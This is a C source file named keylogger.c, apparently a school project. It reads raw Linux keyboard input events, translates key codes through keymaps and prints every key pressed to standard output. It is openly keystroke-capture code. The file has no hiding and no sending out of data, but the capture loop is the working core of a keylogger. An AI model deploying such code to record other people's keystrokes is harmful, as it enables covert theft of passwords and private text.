/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   keylogger.c                                        :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: root </var/mail/root>                      +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/09/28 05:57:11 by root              #+#    #+#             */
/*   Updated: 2018/10/31 18:37:48 by root             ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <signal.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <linux/kd.h>
#include <wchar.h>

#include "keylogger.h"
#include "keys.h"
#include "debug.h"

static int			loop;

static void 		sigint(int sig)
{
	(void)sig;
	loop = 0;
}

static int  		print_keysym(int **key_table, int index, int state, int *capslock)
{
	static int		modifier = 0;
	int				code;
	int 			type;
	int 			value;
	const char 		*p;

	code = key_table[index][modifier];
	type = KTYP(code);
	value = KVAL(code);
	if (type >= syms_size) {
		code = code ^ 0xf000;
		if (code < 0)
			return printf("(null)");
		if (code < 0x80)
			return printf("%s", iso646_syms[code]);
		return printf("%#04x", code);
	}
	if (type == KT_LETTER)
		type = KT_LATIN;
	if (type < syms_size && value < syms[type].size) {
		if (type == KT_SHIFT)
			return shift_handler(value, state, &modifier, capslock);
		if (type == KT_LOCK)
			return lock_handler(value, state, &modifier, capslock);
		if (state && (p = syms[type].table[value])[0])
				return printf("%s", p);
		return 0;
	}
	if (type == KT_META && value < 128 && value < syms[0].size && (p = syms[0].table[value])[0])
		return printf("Meta_%s", p);
	return printf("%#04x", code);
}

void					keylogger(int keybd, int **key_table, int capslock, int numlock)
{
	int					nbread;			// Number of events received at once.
	struct input_event	events[128];	// Events.
	int 				value;			// which key have been pressed.
	int 				state;			// state 0: released 1:pressed 2:repeated

	(void)numlock;
	signal(SIGINT, sigint);
	loop = 1;
	while (loop)
	{
		value = state = 0;
		nbread = read(keybd, events, sizeof(struct input_event) * 128);
		// printf("---------------------------------------------------------\n");
		for (size_t i = 0; i < nbread / sizeof(struct input_event); i++)
		{
			if (events[i].type == EV_KEY) {
				value = events[i].code;
				state = events[i].value;
			}
			// printf("[%s] ", event[events[i].type].name);
			// if (events[i].type == EV_KEY) {
			// 	printf("%s ", key[events[i].code].name);
			// 	printf("%s ", (events[i].value == 0) ? "OFF" : (events[i].value == 1) ? "ON" : " REPEAT");
			// }
			// else if (events[i].type == EV_MSC) {
			// 	printf("%s ", msc[events[i].code].name);
			// 	printf("%d ", events[i].value);
			// }
			// else if (events[i].type == EV_LED) {
			// 	printf("%s ", led[events[i].code].name);
			// 	printf("%d ", events[i].value);
			// }
			// else {
			// 	printf("%d ", events[i].code);
			// 	printf("%d ", events[i].value);
			// }
			// printf("\n");
		}
		print_keysym(key_table, value, state, &capslock);
		fflush(stdout);
		// printf("---------------------------------------------------------\n");
	}
}
